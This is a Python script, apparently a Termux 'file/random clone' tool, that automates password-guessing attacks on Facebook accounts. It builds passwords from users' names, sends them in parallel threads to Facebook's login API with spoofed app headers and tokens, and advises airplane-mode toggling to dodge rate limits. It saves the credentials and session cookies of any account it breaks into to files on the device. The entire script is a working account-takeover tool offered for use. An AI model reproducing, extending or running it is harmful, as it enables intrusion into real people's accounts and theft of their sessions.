#________________ IMPORT ______________#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#________________ LOOP ______________#
loop=0;oks=[];cps=[]
#________________ COLOUR ______________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\x1b[38;5;146m';T = "\x1b[1;95m"
#________________ LINEX ______________#
def clear():os.system('clear');print(logo)
def linex():print(f'{T}──────────────────────────────────────────────────')
#________________ UA ______________#
def uax():
    END = '[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217954;FBDM/{density=2.4,width=1080,height=2400};FBLC/en_GB;FBRV/0;FBCR/Banglalink;FBMF/Samsung;FBBD/Galaxy M54;FBPN/com.facebook.katana;FBDV/SM-M546B/1.1.1;FBOP/13;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-M546B  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#________________ LOGOX ______________#
logo=(f'''
      {A} _   _  _____  ___    _  ___   
      {A}( ) ( )(  _  )(  _`\ (_)(  _`\ 
      {G}| |_| || (_) || (_) )| || (_) )
      {G}|  _  ||  _  ||  _ <'| ||  _ <'
      {G}| | | || | | || (_) )| || (_) )
      {A}(_) (_)(_) (_)(____/'(_)(____/' V/{G}0.{A}1
{T}──────────────────────────────────────────────────
{S}={T}[{G}≣{T}]{S}={A} OWNER : HABIB HOSSAIN
{S}={T}[{G}≣{T}]{S}={A} TOOL  : FILE{S}={T}[{G}X{T}]{S}={A}RANDOM CLONE
{T}──────────────────────────────────────────────────''')
#________________ MAIN-MENU ______________#
def main():
    clear()
    print(f'{S}={T}[{G}1{T}]{S}={A} FILE CLONING ');print(f'{S}={T}[{G}2{T}]{S}={A} RANDOM CLONING ');print(f'{S}={T}[{G}0{T}]{S}={A} EXIT HABIB TOOL ');linex();option=input(f'{S}={T}[{G}?{T}]{S}={A} CHOICE : ')
    if option in ['1','A']:__filexx__()
    if option in ['2','B']:__randomxx__()
    if option in ['0','00']:exit()
    else:
        exit(f'{S}={T}[{G}≣{T}]{S}={A} OPTION NOT FOUND ')
#________________ FILE ______________#
def __filexx__():
    clear()
    print(f"{S}={T}[{G}≣{T}]{S}={A} EXAMPLE : /sdcard/Mridul.txt ");linex();filex=input(f'{S}={T}[{G}?{T}]{S}={A} FILE NAME : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{S}={T}[{G}≣{T}]{S}={A} FILE NOT FOUND ');slp(2)
        __filexx__()
    clear()
    try:
        pas_limit=int(input(f'{S}={T}[{G}≣{T}]{S}={A} PASSWORD LIMIT : '))
    except:
        pas_limit=1
    clear()
    print(f"{S}={T}[{G}≣{T}]{S}={A} EXAMPLE : firstlast/first123/first@@ ");print(f"{S}={T}[{G}≣{T}]{S}={A} EXAMPLE : 57273200/59039200/57575751 ");linex()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'{S}={T}[{G}?{T}]{S}={A} PASSWORD NO {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as habibx:
        tl=str(len(fo))
        clear()
        print(f'{S}={T}[{G}≣{T}]{S}={A} TOTAL UID :{Y} '+tl);print(f'{S}={T}[{G}≣{T}]{S}={A} USE AIRPLANE MODE EVERY 5 MINTS ');linex()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            habibx.submit(filemethod,ids,names,passlist)
    print(" ");print(f'\n{T}──────────────────────────────────────────────────');print(f'{S}={T}[{G}≣{T}]{S}={A} CLONE HAS BEEN COMPLETE');print(f'{S}={T}[{G}≣{T}]{S}={A} TOTAL OK/CP :{G} '+str(len(oks))+'/'+str(len(cps)));print(f'\n{T}──────────────────────────────────────────────────');exit()
#________________ FILE-METHOD ______________#
def filemethod(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write(f'\r\r{S}={T}[{G1}MRM-X01-XD{T}]{S}={Y} %s {G}OK{T}/{P}CP{G} %s{T}/{P}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uax(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f'\r\r{S}={T}[{G}HABIB-OK{T}]{S}={G} '+ids+f' {T}|{G} '+pas)
                #print(f"\r\r{S}={T}[{G}COKI{T}]{S}={A} "+coki)
                open('/sdcard/HABIB-M1-OK-COKI.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print(f'\r\r{S}={T}[{P}HABIB-CP{T}]{S}={P} '+ids+f' {T}|{P} '+pas)
                open('/sdcard/HABIB-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#________________ END ______________#
main()
